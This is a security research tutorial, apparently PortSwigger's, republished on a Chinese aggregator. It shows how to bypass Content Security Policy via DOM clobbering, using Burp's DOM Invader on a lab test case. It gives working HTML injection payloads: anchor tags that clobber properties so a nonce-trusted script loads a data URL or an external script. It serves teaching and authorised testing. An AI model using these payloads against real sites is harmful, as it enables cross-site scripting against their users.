---
title: Bypassing CSP via DOM clobbering
url: https://buaq.net/go-167360.html
source: unSafe.sh - 不安全
date: 2023-06-06
fetch_date: 2025-10-04T11:46:22.985114
---

# Bypassing CSP via DOM clobbering

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/d14fe96703fe8f996c948e329bb32c2c.jpg)

Bypassing CSP via DOM clobbering

Published: 05 June 2023 at 14:00 UTC
*2023-6-5 22:0:0
Author: [portswigger.net(查看原文)](/jump-167360.htm)
阅读量:50
收藏*

---

![Gareth Heyes](https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png)

* **Published:** 05 June 2023 at 14:00 UTC
* **Updated:** 05 June 2023 at 14:00 UTC

![An image with two fists punching some text with XSS](https://portswigger.net/cms/images/8a/73/b9a7-article-clobbering_variables_article.png)

You might have found HTML injection, but unfortunately identified that the site is protected with [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy). All is not lost, it might be possible to bypass CSP using [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering), which you can now detect using DOM Invader! In this post we'll show you how.

We've based the test case on a bug bounty site, so you're likely to encounter similar code in the wild. If you're unfamiliar with [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering) then head over to our Academy to learn about this attack class and solve the labs.

## What you need for the exploit

To exploit DOM clobbering you need three things:

1. HTML injection
2. A gadget - a property name or multiple property names
3. A sink

To bypass CSP, your gadget needs to end up in a sink that is allowed by the policy. This could be an `eval` function. More realistically, it could be a script that is protected by a nonce and a [strict-dynamic](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#strict-dynamic) source expression in the CSP. When using `strict-dynamic` the script protected by a nonce is allowed to generate other scripts. We can take advantage of that to introduce our own scripts.

## Identifying a DOM clobbering vulnerability

First we need to load our test case in Burp browser. To access the test case, visit the following link: [DOM clobbering test case protected by CSP](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/).

Then we need to [enable DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling):

![A screenshot showing the test case being loaded with DOM Invader enabled](https://portswigger.net/cms/images/97/91/96d9-article-dom-invader-load-testcase.png)

Once DOM Invader is enabled, we need to [enable DOM clobbering detection](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-clobbering). You'll notice that DOM Invader shows a warning message, as DOM clobbering attacks may cause the site to break. We therefore recommend that you only enable DOM clobbering when you want to test a specific page.

![A screenshot showing DOM clobbering being enabled](https://portswigger.net/cms/images/43/b2/403c-article-dom-invader-dom-clobbering-enabling.png)

Then we need to reload the test case. If everything goes well you'll see that DOM Invader has found one sink named `script.src`. You'll notice that the sink value contains a string `domclobbering`, followed by two property names and a canary. This is the method DOM invader uses to find DOM clobbering vulnerabilities because multiple sinks and values could contain a clobbered property.

![A screenshot showing the DOM clobbering attack ending up in a sink](https://portswigger.net/cms/images/29/d8/f489-article-dom-invader-sink.png)

## Bypassing CSP to exploit the vulnerability

We've found a vulnerability and now we need to construct a DOM clobbering attack. Remember we also need HTML injection. Thankfully our test case [has such a hole](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/?x=MY%20HTML%20HERE).

We can try injecting a script. Notice that CSP prevents execution. Then we can use the information that DOM Invader has reported to construct an attack that attempts to bypass the CSP. Using the sink value in the above screenshot it looks like we need the properties `ehy` and `codeBasePath`. Notice that the sink value also contains a path `/utils.js` to a JavaScript file. We'll need to account for this in our exploit with a single line comment.

We now need to craft an exploit. If you need to refresh your memory on how to do this, visit the learning materials on our [Academy](https://portswigger.net/web-security/dom-based/dom-clobbering). We know the gadget ends up in a `script.src` attribute. If we click the stack trace and view the console we'll see the exact line where the sink occurs. Creating the exploit involves injecting two anchor tags that clobbers those properties:

`<a id=ehy><a id=ehy name=codeBasePath href=data:,alert(1)//>`

[View the solution](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/?x=%3Ca%20id=ehy%3E%3Ca%20id=ehy%20name=codeBasePath%20href=data:,alert(1)//%3E)

In the example we use a data URL, it's worth noting that this is not required it just was more elegant. You can use HTTP URLs instead and this will work perfectly fine. Notice I use a question mark instead of a single line comment to move the utils filename to the query string.

`<a id=ehy><a id=ehy name=codeBasePath href="//subdomain1.portswigger-labs.net/xss/xss.js?">`

[HTTP example](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/?x=%3Ca%20id=ehy%3E%3Ca%20id=ehy%20name=codeBasePath%20href=//subdomain1.portswigger-labs.net/xss/xss.js?%3E)

[Back to all articles](https://portswigger.net/research/articles)

文章来源: https://portswigger.net/research/bypassing-csp-via-dom-clobbering
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)